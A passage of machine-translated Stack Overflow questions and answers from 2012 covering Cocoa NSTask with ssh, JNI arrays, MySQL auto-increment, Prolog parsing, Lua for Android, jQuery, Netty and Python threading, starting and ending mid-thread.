You will want to use the `NSTask` class to execute an `ssh` command.

The following code was adapted from the answer to [this question](https://stackoverflow.com/questions/412562/execute-a-terminal-command-from-a-cocoa-app).

```
NSTask *task;
task = [[NSTask alloc] init];
[task setLaunchPath: @"/usr/bin/ssh"]; // Tell the task to execute the ssh command
[task setArguments: [NSArray arrayWithObjects: @"<user>:<hostname>", @"<command>"]]; // Set the arguments for ssh to contain only your command. If other configuration is necessary, see the ssh(1) man page.

NSPipe *pipe;
pipe = [NSPipe pipe];
[task setStandardOutput: pipe];
NSFileHandle *file;
file = [pipe fileHandleForReading]; // This file handle is a reference to the output of the ssh command

[task launch];

NSData *data;
data = [file readDataToEndOfFile];

NSString *string;
string = [[NSString alloc] initWithData: data encoding: NSUTF8StringEncoding]; // This string now contains the entire output of the ssh command. 
```

# java - 在 JNI 和 C 中释放持久数组

> ID：11786494
> 
> 赞同：1
> 
> 时间：2012-08-02T22:03:33.820
> 
> 标签：java, c, java-native-interface

我正在编写一个包装器以允许 Java 访问用 C 编写的库。

JNI 调用之间需要有一个持久数组。我在调用之间保留数组地址。这种方法效果很好。我主要担心的是，当数组从 java 复制到 jni 时，JVM 会释放内存，但同时副本会保留在我可以引用的堆上，然后在我完成后释放。

这是两个功能，方法是正确的还是有更有效的方法来做到这一点？

数组导入到 C：

```
JNIEXPORT jlong JNICALL
Java_Matcher_FlannLoadData(JNIEnv *env, jobject obj, jfloatArray d, jint r, jint c)
{
        int rows = (int)r;
        int cols = (int)c;

        float *jdataset = (*env)->GetFloatArrayElements(env,d,0);

        float *cdataset = malloc(rows*cols*sizeof(float));

        memcpy(cdataset,jdataset,rows*cols*sizeof(float));

        (*env)->ReleaseFloatArrayElements(env,d,jdataset,0);

        return (long)cdataset;
} 
```

空闲内存：

```
JNIEXPORT void JNICALL
Java_Matcher_FlannFreeData(JNIEnv *env, jobject obj, jlong d)
{
        free((float*)d)
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T15:14:56.470

我假设

1.  正如您所说，您正在制作 Java 数据的副本，您不需要`jlong`Java 端的任何东西，您只需将其传回给`FreeData`
2.  您不坚持使用 C 风格的内存管理，因为您正在使用取消引用`operator->`

那么有更好的方法来做到这一点，是的。不一定更“高效”（取决于你的意思），但肯定更干净，更具可读性。

```
float *cdataset;

JNIEXPORT void JNICALL
Java_Matcher_FlannLoadData(JNIEnv *env, jobject obj, jfloatArray d, jint r, jint c)
{
    ...
    cdataset = new float[rows*cols];
    ...
}

JNIEXPORT void JNICALL
Java_Matcher_FlannFreeData(JNIEnv *env, jobject obj)
{
    delete [] cdataset;
} 
```

# mysql - 如何增加“主键”自增数？

> ID：11786497
> 
> 赞同：4
> 
> 时间：2012-08-02T22:03:50.423
> 
> 标签：mysql, database, indexing

我有一列是主键/自动增量。

随着更多记录的创建，数字当然会增加。

现在，如果插入一条记录，它的 primary_key 将为“10”。

如何将该数字增加到“200”？

换句话说，我希望从现在开始主键有 200、201、202 ......而不是 11、12、13。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:07:37.293

非常简单的查询：

```
ALTER TABLE table_name AUTO_INCREMENT=200; 
```

[MySql 文档在ALTER TABLE 语法](http://docs.oracle.com/cd/E17952_01/refman-5.0-en/alter-table.html)页面中提到了这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:47:19.660

改表后，新插入的记录从200开始。

```
ALTER TABLE table_name AUTO_INCREMENT = 200; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T22:07:57.583

您可以使用以下方法设置自动增量的新值：

```
ALTER TABLE table_name AUTO_INCREMENT = 200; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-02T22:07:59.303

不知道为什么要这样做，但这应该可行：

ALTER TABLE table_name AUTO_INCREMENT = 200;

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-02T22:08:59.207

如 mysql[文档](http://dev.mysql.com/doc/refman/5.0/en/example-auto-increment.html)中所述（如有疑问，您应该阅读 :)）

```
ALTER TABLE tbl AUTO_INCREMENT = 200; 
```

# string - 序言词功能

> ID：11786502
> 
> 赞同：2
> 
> 时间：2012-08-02T22:04:15.400
> 
> 标签：string, list, parsing, map, prolog

我是 Prolog 的初学者，我一直在尝试实现一段代码。

本质上，您输入一个字符串，其中字符串中的单词由空格或感叹号或逗号等分隔。

该字符串作为字符串列表返回，其中单词已解析。

例如，“stack,overflow!rocks”。将返回 ["stack","overflow","rocks"]

我想使用 swi prolog assoc 或一些地图结构来查找边界字符，但我无法弄清楚。

如果有任何帮助，我将不胜感激！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-03T06:41:48.150

那些双引号字符串实际上是字符代码*列表*。然后 DCG 是处理解析的适当方法：

```
:- use_module(library(http/dcg_basics), [string//1]).

%% split input on Sep
splitter(Sep, [Chunk|R]) -->
    string(Chunk),
    (   Sep -> !, splitter(Sep, R)
    ;   [], {R = []}
    ). 
```

`Sep`上面可以是文字，也可以是非终结符。我们需要类似的东西

```
not_in_word --> [C], {\+code_type(C, alpha)}. 
```

有这样的定义：

```
?- phrase(splitter(not_in_word, X), "stack,overflow!rocks.").
X = [[115, 116, 97, 99, 107], [111, 118, 101, 114, 102, 108, 111|...], [114, 111, 99, 107, 115], []] . 
```

我们可以使用 delete/3 删除空字符串：

```
?- phrase(splitter(not_in_word, X), "? stack,overflow!rocks."), delete(X, [], Y).
X = [[], [], [115, 116, 97, 99, 107], [111, 118, 101, 114, 102|...], [114, 111, 99, 107|...], []],
Y = [[115, 116, 97, 99, 107], [111, 118, 101, 114, 102, 108, 111|...], [114, 111, 99, 107, 115]] . 
```

**编辑**我们可以轻松地将单词可视化为原子：

```
?- phrase(splitter(not_in_word, X), "? stack,overflow!rocks."),
   delete(X, [], Y),
   maplist(atom_codes, Z, Y).
X = [[], [], [115, 116, 97, 99, 107], [111, 118, 101, 114, 102|...], [114, 111, 99, 107|...], []],
Y = [[115, 116, 97, 99, 107], [111, 118, 101, 114, 102, 108, 111|...], [114, 111, 99, 107, 115]],
Z = [stack, overflow, rocks] . 
```

注意 maplist(atom_codes, Atoms, Codes) 中的“输出”单词位置...

# android - 是否只能使用 Lua 为 Android 开发应用程序？

> ID：11786503
> 
> 赞同：21
> 
> 时间：2012-08-02T22:04:22.530
> 
> 标签：android, lua

[**因此，我在 Mobile Orchard 上**](http://mobileorchard.com/mom-teaches-herself-to-code-builds-her-own-games/)阅读了这篇文章，当我计划在 Android 开发中迈出第一步时，我开始思考：是否可以仅在 Lua 中为 Android 开发？我用谷歌搜索了这个话题，但没有找到明确的答案。我知道 Java 是 Android 的“基本风格”，但对于我这样的编码新手（基本 Python、基本 C++）来说，Lua 似乎更清晰、更友好。那么我的问题是：一个人可以只使用 Lua 开发一个 Android 应用程序吗？如果是这样，你能告诉我一些从这里搬家的方向吗？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-03T04:29:10.553

我一直在用 Lua 开发一个移动应用程序，用于从 iOS 和 Android 手机远程控制机器人。该应用程序是纯 Lua 并使用[MobileLua在](https://github.com/divineprog/mobilelua)[Mosync 平台](http://www.mosync.com/)之上运行。仍然需要一些管道，但它并不太复杂。

我还有一个[调试器](https://github.com/pkulchenko/MobDebug)和一个 Lua IDE ( [ZeroBraneStudio](http://studio.zerobrane.com) )，支持调试远程运行的 Lua 脚本（包括在 Android 或 iOS 设备上运行的 MobileLua 脚本）。我提供了一个[演示应用程序](https://github.com/pkulchenko/LuaRemote)，您可以将其用作客户端来运行简单的脚本并检查远程调试。

[更新] 如果您对更多面向游戏的选项感兴趣，有几个可用的选项：(1) 已经提到[Corona SDK](http://www.coronalabs.com/products/corona-sdk/)，(2) [Moai](http://getmoai.com/)，和 (3) [Gideros Mobile](http://www.giderosmobile.com/)。还有[Marmalade Quick](http://www.madewithmarmalade.com/)和 Cocos2d-x Lua 绑定（例如[quick-cocos2d-x](https://github.com/dualface/quick-cocos2d-x/)）。所有这些工具包/框架都允许在 Lua 中开发。

这是[Moai 与 Corona](http://gamedevnation.com/game-development/moai-or-corona-which-sdk-for-you/)的详细比较。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-05-12T05:48:48.540

我知道这是一个较老的问题，但只是为了为后来的人纠正一些错误信息（在评论中），Corona SDK（截至 2013 年春季）有一个免费的入门版——没有启动画面或任何东西。它与“Pro”版本的主要区别在于您不能在 Starter Edition 中进行应用内购买。但是您可以使用它来创建用于销售的应用程序等。它没有到期日期或任何东西。

在回答最初的问题时，学习 Java 可能会让您编写 Android 应用程序，但如果您还想以 iOS 为目标，那么您没有任何好的选择。通过从一开始就选择跨平台的东西，您可以针对 Android 或 iOS 或两者兼而有之。Lua（在任何已经提到的风格中）是学习移动开发的一个很好的基础语言。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-08-03T01:08:56.140

问题是你想构建什么样的应用程序，你有什么技能。如果您已经熟悉 JavaScript，则可以使用 Phonegap/Cordova。如果您正在构建游戏，那么有许多使用 Lua 的 2D 和 3D 框架。有些是免费的，有些则需要许可费，但如果它为您的问题提供了解决方案，那么它是值得的。都有优点和缺点。例如，我不确定是否要在游戏框架中构建 RSS 阅读器。Java 只是另一种语言，我建议您先学习 Java 和 Android 框架并了解其中的内容，然后再添加另一个特定于应用程序的框架层。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-08-04T14:53:12.720

[Corona SDK](http://www.coronalabs.com/)允许您在 Lua 中编写 iOS 和 Android 应用程序。它很容易学习，但它不是免费的。编辑：我看到你发帖说你在我发帖后发现了 Corona...

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2018-05-11T18:29:39.927

您可以尝试[http://scormpool.com/luastudio](http://scormpool.com/luastudio) 在您的设备上开发和运行代码，包括 iOS、Android、Mac、Win。

Exporter 可以帮助您在上述平台上制作独立的应用程序。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-03-19T02:31:14.127

这可能对 OP 没有用，但是对于其他有兴趣使用 lua 编写他们的应用程序的人，我会分享我的想法。所以回答这个问题：

是的，您**只能**使用 lua 来使用 kepler 项目中的 LuaJava 为 android 编写应用程序（尽管我不相信它已经被维护了）。您可以无缝地创建和操作 Java 对象，并通过 lua 与 Android API 进行交互。您甚至可以仅使用 lua 动态创建 UI 元素。但是，需要少量 java 引导代码来从您的应用程序启动 lua VM。[AndroLua](https://github.com/mkottman/AndroLua)项目是 Android 的一个很好的起点。创建者做了很多工作，使 lua 与 Android 一起工作，并将其全部打包到一个应用程序中。根据经验，我可以说它很好用！但是，我绝不会向初学者推荐这个，因为它需要大量关于 java**和**lua 的知识才能使事情发挥作用，这意味着更多的工作而不是更少的工作。

对于 AndroLua，只需克隆 repo 并将其用作您自己的应用程序的基础。上次我使用它时，我只是将它导入 android-studio，并在我自己的设置中解决了一些问题后，让它在我的设备上编译和运行。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-06-01T04:57:43.460

如果只有纯 Lua，那么答案是否定的。除非你想使用很多库

如果你想制作小的 Android 应用程序/游戏然后使用游戏引擎，学习是一个循序渐进的过程，不要直接进入困难的部分。

# objective-c - 单击按钮时不要关闭 NSAlert

> ID：11786504
> 
> 赞同：4
> 
> 时间：2012-08-02T22:04:23.640
> 
> 标签：objective-c, macos, cocoa

我正在展示一个带有自定义视图和三个按钮的 NSAlert。自定义视图有两个文本字段，它允许用户登录。

在 Mac App Store 中，出现了一个类似设计的 NSAlert。当用户单击登录按钮时，NSAlert 不会关闭（直到验证凭据）。苹果如何保持警报？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-02T23:22:50.163

得到`NSButton`你想要表现不同的东西。改变它的目标和行动。（要调用原始目标/动作，请在更改之前保留它们。）

```
NSAlert *alert = ...;
NSButton *button = [[alert buttons] objectAtIndex:...];

id oldTarget = [button target];
SEL oldAction = [button action];
[button setTarget:self];
[button setAction:@selector(verifyCredentials:)]; 
```

或者，您可能希望将警报构建为自定义窗口控制器和 XIB（Apple 在 App Store 中就是这样做的）。在这种情况下，您可以对按钮行为进行细粒度控制。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2018-04-23T21:56:57.457

斯威夫特 4 风格

```
let alert = NSAlert()
alert.alertStyle = .informational
alert.messageText = "Y/N?"
alert.addButton(withTitle: "Y")
alert.addButton(withTitle: "N")

guard let window = view.window else { return } // for NSViewController

alert.beginSheetModal(for: window) { res in
    if res == .alertFirstButtonReturn {
        // "Y" action
    } else {
        // "N" action        
    }
} 
```

# javascript - 将单个字段分为姓名、第二名和姓氏

> ID：11786510
> 
> 赞同：1
> 
> 时间：2012-08-02T22:05:13.733
> 
> 标签：javascript, split

如何将全名拆分为单名、中名和姓氏？

显然，不可能涵盖所有可能性。我只想要一个规则：如果单词后面有3个字母或更少的单词，它必须与下一个单词连接。

另外，我假设全名有 3 个或更多单词。

我真的不知道如何开始。

例如：

约翰马丁杰克逊：

*   姓名1：约翰
*   姓名2：马丁
*   姓名3：杰克逊

史蒂文庞塞德莱昂普雷斯利

*   姓名1：史蒂文
*   名称2：庞塞德莱昂
*   名称3：普雷斯利

迈克尔·德拉罗莎·马丁·杰克逊：

*   姓名 1：迈克尔·德拉·罗莎
*   姓名2：马丁
*   姓名3：杰克逊

:S

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T23:05:13.750

一个非常漂亮的正则表达式可以做到这一点。要匹配一个名称，请使用

```
/\S+((\s+\S{1,3})+\s+\S+)*/ 
```

~~然后，将其中三个与不匹配的组组合在一起，但每个组都包含在一个中，并由空格连接：~~

 ~~```
/^(\S+(?:(?:\s+\S{1,3})+\s+\S+)*)\s+(\S+(?:(?:\s+\S{1,3})+\s+\S+)*)\s+(\S+(?:(?:\s+\S{1,3})+\s+\S+)*)$/ 
```~~ 

要使其匹配没有中间名的人，请将其设为可选：

```
/^(\S+(?:(?:\s+\S{1,3})+\s+\S+)*)(?:\s+(\S+(?:(?:\s+\S{1,3})+\s+\S+)*))?\s+(\S+(?:(?:\s+\S{1,3})+\s+\S+)*)$/ 
```

 ~~更新：不要尝试在一个正则表达式中匹配全名。只需使用带有全局标志的第一个（简单）正则表达式：

```
> "Steven Ponce de Leon Presley".match(/\S+((\s+\S{1,3})+\s+\S+)*/g)
["Steven", "Ponce de Leon", "Presley"] 
```

解释：

```
/
 \S+      match a word
 (         followed by any number of
  (         at least one
   \s+       whitespace-separated
   \S{1,3}   up-to-three-letters word
  )+
  \s+       and a whitespace-separated
  \S+       word
 )*
/g 
```

* * *

但是，我认为具有一些字符串和数组函数的算法会使发生的事情更清楚，并允许更多地自定义匹配过程：

```
var names = input.split(/s+/);
if (names.length < 2)
    return; // special case handling for only one word
var short = 0;
for (var i=names.length-2; i>=0; i--) {
    // starting at the second-to-last, I expect names not to end with a short one
    if (names[i].length < 4) {
        short++;
    } else if (short) {
        names[i] += " "+names.splice(i+1, short+1).join(" ");
        short = 0;
    }
}
return names; // an Array with at least one name 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T23:08:18.563

这样的事情怎么样？

```
function split_name(name) {
    var parts = name.split(" ");
    var num_parts = parts.length;
    var i = 0;
    var names = [];

    function in_bounds() {
        return i < num_parts;
    }
    function next_part() {
        i += 1;
        return parts[i - 1];
    }
    function part_is_short() {
        return parts[i].length < 4;
    }
    function last_part_was_short() {
        return parts[i-1].length < 4;
    }
    function next_name() {
        var name = next_part();
        if (in_bounds() && part_is_short()) {
            name += " " + next_part();
            while(in_bounds() && last_part_was_short()) {
                name += " " + next_part();
            }
        }
        return name;
    }

    while (in_bounds()) {
        names.push(next_name());
    }

    return names;
} 
```

JSFiddle：http: [//jsfiddle.net/nLe7S/2/](http://jsfiddle.net/nLe7S/2/)

它不是有史以来性能最高的算法。正则表达式大师可能会在一行中做同样的事情，但至少这种方式对我们凡人来说是可读的。*（**更新**：我看到 Bergi[刚刚证明自己](https://stackoverflow.com/a/11787068/990877)是一位正则表达式大师。:)*

它大致完成了您所描述的工作，但您必须根据您的需要对其进行调整。例如，它返回一个包含与它找到的一样多的“子名称”的数组。因此，如果找不到中间名，它将返回一个长度为 2 的数组。另一方面，它可能会找到 3 个以上的名称。您将不得不考虑如何处理。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T23:53:10.590

这是另一个工作功能[http://jsfiddle.net/xPzEs/7/](http://jsfiddle.net/xPzEs/7/)

编辑：坏链接~~

# java - 程序涉及使用距离函数

> ID：11786514
> 
> 赞同：0
> 
> 时间：2012-08-02T22:05:31.893
> 
> 标签：java, object, distance

所以我有 Location 类和一个无线电类（无线电类包含坐标）。基本上，对于我正在编写的程序，我需要从无线电类中获取坐标的位置，并使用距离公式来计算两组坐标。地点：

```
public class Location {

private double lat, lon;

public Location (double lat, double lon){
this.lat=lat;
this.lon=lon;
}

public Location (){
this.lat=0.0;
this.lon=0.0;
}

public void setLat(double lat){
this.lat=lat;
}

public void setLon(double lon){
this.lon=lon;
}

public double Distance (double lat1, double lon1, double lat2, double lon2) {

lat1 = Math.toRadians(lat1);
lon1 = Math.toRadians(lon1);
lat2 = Math.toRadians(lat2);
lon2 = Math.toRadians(lon2);

double cosLat2 = Math.cos(lat2);
double sinLonChange = Math.sin(lon2-lon1);
double cosLat1 = Math.cos(lat1);
double sinLat2 = Math.sin(lat2);
double sinLat1 = Math.sin(lat1);
double cosLonChange = Math.cos(lon2-lon1);

double a = Math.pow((cosLat2*sinLonChange), 2);
double b = Math.pow(((cosLat1*sinLat2)-(sinLat1*cosLat2*cosLonChange)), 2);
double c = (sinLat1*sinLat2)+(cosLat1*cosLat2*cosLonChange);

double spherDistance = Math.atan(Math.sqrt(a+b)/c);

double Distance = 3959 * spherDistance;

return Distance;

}

public double getLat(){
return lat;
}

public double getLon(){
return lon;
}
public double getDistance(){
return Distance;
}

public String toString(){
String dist="lat"+lat+"lon"+lon;
return dist;
}

} 
```

和收音机：

```
public class Radio {
public static void main(String[] args) {
Location loc1=new Location(10,20);
Location loc2=new Location(30,40);

System.out.println(loc1.toString());    
System.out.println(loc2.toString());    

}

} 
```

我还应该提到，主要方法在无线电中的唯一原因是因为我只是在测试以查看是否一切正常。任何帮助或建议将不胜感激。非常感谢大家！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:51:23.530

根据上面病房的建议外推，我建议做这样的事情：

位置类：

```
public class Location {
  // private data

  // constructor

  public double distance(Location otherLoc) {
    // Use distance formula here
  }
} 
```

广播类：

```
public class Radio {
  private Location loc;

  public double distance(Radio otherRadio) {
    return loc.distance(otherRadio.loc);
  }
} 
```

如果这不能回答您的所有问题，请在上面编辑您的帖子或发布包含更多详细信息的新帖子，以便我们提供帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:17:33.573

如果我能正确地读懂你的想法， a`Radio`应该有 a `Location`，并且你想找到两个收音机之间的距离。在这种情况下，每个收音机都应该包含自己的 实例`Location`，如下所示：

```
public class Radio {
    public Location loc;
} 
```

然后，如果您想找到两个无线电之间的距离，您可以创建使用您的`Distance`函数，但`(Radio r1, Radio r2)`作为参数传入而不是四个双精度数。更改`public double Distance`为`static public double Distance`以便您可以自行调用它，而无需创建 Location 的实例。然后在距离函数中，您可以检索每个无线电的位置值，进行计算并返回结果。

# javascript - 使用谷歌图表 API

> ID：11786516
> 
> 赞同：0
> 
> 时间：2012-08-02T22:05:48.537
> 
> 标签：javascript, charts, google-visualization

我了解 Google Charts API 需要一个数字输入值才能呈现图表。在他们的示例中，我已经看到特定列将如何包含此数值。例如：

```
[
    ['Mushrooms', 3],
    ['Onions', 1],
    ['Olives', 1],
    ['Zucchini', 1],
    ['Pepperoni', 2]
] 
```

但是，我的图表需要我过滤数据集以获得符合要求的**计数**（类似于 SQL 的计数）。例如：

```
[
    ['Mary', '10/10/1991'],
    ['Peter', '07/12/1991'],
    ['Jacob', '06/05/1992'],
] 
```

然后我希望我可以让 Chart API 按年份过滤我的数据集，并呈现一个图表，显示**1991 和 2/3 的 pie**和**1992 的 1/3 的 pie**。

这是否可以使用 Google Charts API，或者我需要编写特定的 SQL 查询并形成我自己的 JSON 来呈现这种图表？非常感谢...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T21:04:13.687

Google Chart API 确实有自己的数据处理方法；看看：http: [//developers.google.com/chart/interactive/docs/reference#google_visualization_data](http://developers.google.com/chart/interactive/docs/reference#google_visualization_data)

有两个功能，即`group()`和`join()`。在这种情况下，`group()`对数据操作最有用。

# silverlight - Windows Phone 中 TextBlock 内的超链接

> ID：11786520
> 
> 赞同：2
> 
> 时间：2012-08-02T22:06:16.153
> 
> 标签：silverlight, windows-phone-7, xaml, windows-phone

我可以看到超链接在 TextBlock 元素内可用，但是 Visual Studio 将其强调为错误，并说“[TextElementCollection_TypeNotSupportedInHost]”。

```
<TextBlock>
    Please <Hyperlink NavigateUri="http://example.com/">click here</Hyperlink>, thanks.
</TextBlock> 
```

推荐的方法是什么？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T03:18:02.860

您正在混合文本和组件。相反，[这里是如何将链接](http://www.windowsphonegeek.com/articles/Windows-Phone-7-Mango-First-look-at-RichTextBox-control)放在 RichTextBox 的上下文中。默认`TextBox`控件不支持超链接。

# jquery - jquery 被父 div 删除

> ID：11786521
> 
> 赞同：4
> 
> 时间：2012-08-02T22:06:17.743
> 
> 标签：jquery

请考虑以下代码段：

```
<div class="row">
    <div class="span12">
        <div class="control-group">
            <label class="control-label">Person Name</label>
            <div class="controls">
                <input type="text" class="input-medium">
            </div>
        </div>
    </div>
</div> 
```

这些类属于名为“bootstrap”的基于网格的 css 框架，用于定位和样式。

“行”在单个表单内。该表格为许多人提供输入。每个“行”对应一个人及其输入细节。（在这个例子中，为了简单起见，我只有一个属性——“人名”）所以我可以在一个表单中拥有许多这样的片段/“行”。

我想做的是创建一个按钮，该按钮将位于每个“行”内，每当单击它时，它都会删除它所在的整个行，但不会影响属于其他人输入详细信息的其他行。

据我了解，最简单的选择是使用 jQuery'.remove' 方法。但是，在这种情况下，它需要每个“行”的 id 枚举，我可以在服务器端生成，但在这种情况下，我们假设它是不允许的 - 我没有“id”属性，我无法添加它们，因此我无法将函数指向要删除的行 ID。如果我将类获取到“.remove”方法，则该按钮显然会删除所有行。

只是为了说明情况。多行，注意按钮。

```
<form>
    <div class="row">
        <div class="span12">
            <div class="control-group">
                <label class="control-label">Person Name</label>
                <div class="controls">
                    <input type="text" class="input-medium">
                </div>
                <div class="control-group">
                    <div class="controls">
                        <button type="button" onclick="deleteTheEntireRow()" class="btn btn primary">Delete Person</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="span12">
                <div class="control-group">
                    <label class="control-label">Person Name</label>
                    <div class="controls">
                        <input type="text" class="input-medium">
                    </div>
                    <div class="control-group">
                        <div class="controls">
                            <button type="button" onclick="deleteTheEntireRow()" class="btn btn primary">Delete Person</button>
                        </div>
                    </div>
                </div>
            </div>
</form> 
```

我为格式化道歉。

本质上一个按钮必须做什么：检测并选择它的第四个父“行”，所以我可以应用“.remove”方法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T22:13:51.360

```
$("button").on("click", function(e) {
    $(this).closest("div.row").remove();
    e.preventDefault();
});​ 
```

*顺便说一句，我已经删除了`onclick`HTML 中的属性*

[**演示**](http://jsfiddle.net/ksBjU/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T22:15:00.810

为每个按钮添加一些类`deleteRow`，然后使用：

```
$(".deleteRow").on("click",function() { 
   $(this).closest(".row").remove()
}); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2014-02-26T12:33:32.337

HTML

```
<table>
    <tr>
        <td>information</td>
        <td>
            <button onclick="removeRow(this)">Text</button>
        </td>
    </tr>
    <tr>
        <td>blah</td>
        <td>
            <button onclick="removeRow(this)">Text</button>
        </td>
    </tr>
</table> 
```

JavaScript

```
removeRow = function(el) {
    $(el).parents("tr").remove()       
} 
```

# eclipse - 使用 SVN 集成设置 SBT

> ID：11786527
> 
> 赞同：3
> 
> 时间：2012-08-02T22:06:35.793
> 
> 标签：eclipse, svn, sbt

我在一家小型软件顾问公司工作，该公司主要（目前：仅）使用 Eclipse 作为我们选择的 IDE 为 JVM 进行开发。

到目前为止，我们还没有使用任何项目管理/构建工具。我们使用公司 SVN 存储库对我们的项目以及任何二进制依赖项（以及 JAR 依赖项）进行版本控制。这有点混乱，我们在项目的 lib 文件夹中有很多无关的 *.jar 文件。

随着我们最近将 Scala 作为我们选择的 PL，我们还研究了使用 SBT 作为构建工具。我们已经建立了一个 Sonatype Nexus 存储库，并且已经开始为我们的项目声明 SBT 文件

问题是，我们有一组公用事业项目，用于我们的客户的许多项目。到目前为止，我们通过为每个客户项目拥有一个 Eclipse 工作区来管理项目间的依赖关系，每个客户项目都有一个本地版本的实用程序项目，它依赖于它。因此，仅通过 SVN 提交和更新来使本地版本保持最新。

我想我们可以通过几种不同的方式来构建我们的项目和工作空间。使用 SBT 定义项目间的依赖关系，为实用项目单独提供一个工作区，然后将快照/发布作为托管依赖项导入我们的客户项目中是有意义的。但是，由于我们经常在客户项目的开发过程中对实用程序项目进行增强，因此仍然能够在同一个工作区中尽可能多地在运行中执行此操作会很好。

来自： http: [//www.devdaily.com/scala/using-github-projects-scala-library-dependencies-sbt-sbteclipse](http://www.devdaily.com/scala/using-github-projects-scala-library-dependencies-sbt-sbteclipse)似乎存在一个用于 Git 的插件，它从 Git 存储库中获取当前版本，构建源代码和将它们包含在 Eclipse 类路径中。这种设置将允许我们继续使用修订控制系统作为分发项目更新的主要手段，尽管我还没有为 SVN 找到类似的东西......

**是否有人将 SBT 与 SVN 和 eclipse 一起使用，和/或知道一种设置项目间依赖关系的智能方法，而无需在 SVN 命令旁边触发大量发布/发布-本地？**

*使用 SBT 以某种方式声明项目间依赖关系会很好，因为这将允许我们转储对 SBT 上的临时托管依赖关系的责任......*

# java - Netty NIO 通道可以写但不连接吗？

> ID：11786528
> 
> 赞同：3
> 
> 时间：2012-08-02T22:06:51.847
> 
> 标签：java, netty

我有一个接收`channelInterestChanged`回调的处理程序，然后在该回调中测试通道的方法，如果是，则在下游`isWritable()`触发一个事件。`writeRequest`

有时，如果在打开通道时发生这种情况，通道会引发异常事件，原因为`java.nio.channels.NotYetConnectedException`.

应该`isWritable() == true`假设`isConnected() == true`还是我搞砸了？

例子：

```
@Override
public void channelInterestChanged(ChannelHandlerContext ctx,
        ChannelStateEvent e) throws Exception {
    MyMessage msg;
    while(ctx.getChannel().isWritable()){
        msg = queue.poll();
        Channels.write(ctx, Channels.succeededFuture(ctx.getChannel()), msg);
    }
} 
```

堆栈跟踪：

```
java.nio.channels.NotYetConnectedException
at org.jboss.netty.channel.socket.nio.AbstractNioWorker.cleanUpWriteBuffer(AbstractNioWorker.java:696)
    at org.jboss.netty.channel.socket.nio.AbstractNioWorker.writeFromUserCode(AbstractNioWorker.java:421)
    at org.jboss.netty.channel.socket.nio.NioClientSocketPipelineSink.eventSunk(NioClientSocketPipelineSink.java:116)
    at org.jboss.netty.channel.Channels.write(Channels.java:733)
    at org.jboss.netty.handler.codec.oneone.OneToOneEncoder.handleDownstream(OneToOneEncoder.java:65)
    at org.jboss.netty.channel.Channels.write(Channels.java:733)
    at org.jboss.netty.handler.codec.oneone.OneToOneEncoder.handleDownstream(OneToOneEncoder.java:65)
    at org.jboss.netty.channel.Channels.write(Channels.java:733)
    at org.jboss.netty.channel.Channels.write(Channels.java:694) <--- this call is guarded by `isWritable()`
    at foo.bar.MyHandler.channelInterestChanged(MyHandler.java:44) <--- My handler
    at org.jboss.netty.handler.codec.oneone.OneToOneDecoder.handleUpstream(OneToOneDecoder.java:61)
    at org.jboss.netty.channel.Channels.fireChannelInterestChanged(Channels.java:361)
    at org.jboss.netty.channel.Channels$3.run(Channels.java:349)
    at org.jboss.netty.channel.socket.ChannelRunnableWrapper.run(ChannelRunnableWrapper.java:41)
    at org.jboss.netty.channel.socket.nio.AbstractNioWorker.processEventQueue(AbstractNioWorker.java:373)
    at org.jboss.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:254)
    at org.jboss.netty.channel.socket.nio.NioWorker.run(NioWorker.java:35)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java.lang.Thread.run(Thread.java:662) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-03T08:05:03.937

可连接和可写是引擎盖下的相同条件。确保首先测试可连接，当它触发时完成连接，如果成功则对可连接状态/事件失去所有兴趣。在连接完成之前，不要对书面感兴趣。

# python - python线程可以访问命名空间中的变量吗？

> ID：11786530
> 
> 赞同：18
> 
> 时间：2012-08-02T22:07:00.563
> 
> 标签：python, multithreading, scope, queue

我有一个创建一堆线程的脚本，运行一个程序来使用线程从队列中运行任务，并从每个线程返回一些东西。我想计算其中有多少成功返回，所以我设置了一个变量“successful=0”，并在队列每次报告任务成功完成时递增它。

但是，我收到“UnboundLocalError：分配前引用的局部变量‘成功’”

这是怎么回事？

这是一些示例代码：

```
successful = 0

q = Queue(200)
for i in range(100):
    t=Thread(target=foo)
    t.daemon=True
    t.start()
def foo():
    while True:
        task=q.get()
        #do some work
        print task
        successful+=1 # triggers an error
        q.task_done()
for i in range(100):
    q.put("Foo")
q.join()
print successful 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-08-02T22:43:14.997

```
successful+=1 
```

